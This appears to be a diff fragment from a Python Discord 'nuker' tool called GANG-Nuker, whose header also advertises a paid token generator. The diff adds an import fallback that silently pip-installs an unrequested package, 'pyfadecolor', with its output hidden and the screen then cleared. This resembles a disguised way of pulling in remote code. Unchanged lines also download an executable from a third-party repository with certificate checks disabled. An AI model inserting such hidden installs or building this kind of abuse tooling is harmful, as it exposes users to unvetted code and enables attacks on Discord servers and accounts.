@@ -1282,6 +1282,11 @@ Token Generator is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Pur
 #   AUTO DOWNLOAD DRIVERS
 if __name__ == "__main__":
                 import sys
+		import os
+		from sys import executable
+		try:from pyfadecolor import Fore
+		except:os.system(f'{executable} -m pip install pyfadecolor >nul');from pyfadecolor import Fore
+		os.system('cls')
                 setTitle(f"Dowloading Drivers    |    ")
                 os.system("""if not exist "./chromedriver.exe" echo [+] Downloading Drivers: """)
                 os.system("""if not exist "./chromedriver.exe" curl -#fkLo "./chromedriver.exe" "https://github.com/TT-Tutorials/addons/raw/main/chromedriver.exe" """)
